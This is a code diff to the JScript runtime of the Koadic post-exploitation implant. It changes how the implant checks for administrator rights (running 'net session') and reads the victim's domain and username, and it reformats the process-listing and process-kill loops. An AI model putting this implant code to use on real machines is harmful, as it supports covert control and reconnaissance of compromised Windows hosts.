@@ -131,8 +131,12 @@ Koadic.user.isElevated = function()
 {
     try
     {
-    	  Koadic.WS.RegRead("HKEY_USERS\\s-1-5-19\\");
-    	  return true;
+        var res = Koadic.shell.exec("net session", "%TEMP%\\"+Koadic.uuid()+".txt")
+        if (res.indexOf("Access is denied.") == -1)
+        {
+            return true;
+        }
+        return false;
     }
     catch(e)
     {
@@ -290,7 +294,17 @@ Koadic.user.IPAddrs = function()
 Koadic.user.info = function()
 {
     var net = new ActiveXObject("WScript.Network");
-    var info = net.UserDomain + "\\" + net.Username;
+    var domain = "";
+    if (net.UserDomain.length != 0)
+    {
+        domain = net.UserDomain;
+    }
+    else
+    {
+        domain = Koadic.shell.exec("echo %userdomain%", "%TEMP%\\"+Koadic.uuid()+".txt");
+        domain = domain.split(" \r\n")[0];
+    }
+    var info = domain + "\\" + net.Username;
 
     if (Koadic.user.isElevated())
         info += "*";
@@ -581,8 +595,8 @@ Koadic.process.currentPID = function()
     var processes = Koadic.process.list();
 
     var items = new Enumerator(processes);
-	while (!items.atEnd())
-	{
+    while (!items.atEnd())
+    {
         var proc = items.item();
 
         try
@@ -608,8 +622,8 @@ Koadic.process.currentPID = function()
         } catch (e)
         {
         }
-		items.moveNext();
-	}
+        items.moveNext();
+    }
 
     pid = latestProc.ParentProcessId;
     latestProc.Terminate();
@@ -622,8 +636,8 @@ Koadic.process.kill = function(pid)
     var processes = Koadic.process.list();
 
     var items = new Enumerator(processes);
-	while (!items.atEnd())
-	{
+    while (!items.atEnd())
+    {
         var proc = items.item();
 
         try
@@ -636,8 +650,8 @@ Koadic.process.kill = function(pid)
         } catch (e)
         {
         }
-		items.moveNext();
-	}
+        items.moveNext();
+    }
 
     return false;
 }
